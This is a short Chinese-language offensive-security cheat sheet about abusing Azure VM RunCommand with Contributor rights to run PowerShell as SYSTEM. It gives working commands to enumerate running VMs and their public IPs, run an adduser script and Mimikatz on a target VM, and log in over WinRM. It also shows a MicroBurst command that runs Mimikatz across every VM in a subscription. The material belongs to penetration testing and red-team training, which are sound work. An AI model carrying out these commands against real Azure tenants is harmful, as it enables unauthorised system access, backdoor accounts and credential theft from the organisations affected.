# Azure 服务 - 虚拟机 (Virtual Machine)

## 运行命令 (RunCommand)

> 允许任何拥有“参与者 (Contributor)”权限的人员在订阅中的任何 Azure 虚拟机上以 `NT Authority\System` 身份运行 PowerShell 脚本。

**要求**：`Microsoft.Compute/virtualMachines/runCommand/action`

* 列出可用的虚拟机 (Virtual Machines)

    ```powershell
    PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
    ResourceGroupName    Name       
    -----------------    ----       
    TESTRESOURCES        Remote-Test
    ```

* 通过查询网络接口获取虚拟机的公网 IP (Public IP)

    ```powershell
    PS AzureAD> Get-AzVM -Name <资源名称> -ResourceGroupName <资源组名称> | select -ExpandProperty NetworkProfile
    PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
    PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>
    ```

* 在虚拟机上执行 Powershell 脚本，例如 `adduser` (添加用户)

    ```ps1
    PS AzureAD> Invoke-AzVMRunCommand -VMName <资源名称> -ResourceGroupName <资源组名称> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
    PS Azure C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
    ```

* 最后，你应该能够通过 WinRM 进行连接

    ```ps1
    $password = ConvertTo-SecureString '<密码>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('用户名', $Password)
    $sess = New-PSSession -ComputerName <IP 地址> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
    Enter-PSSession $sess
    ```

使用 `MicroBurst.ps1` 对整个订阅进行操作

```powershell
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

## 参考资料 (References)

* [Running Powershell scripts on Azure VM - Karl Fosaaen - November 6, 2018](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
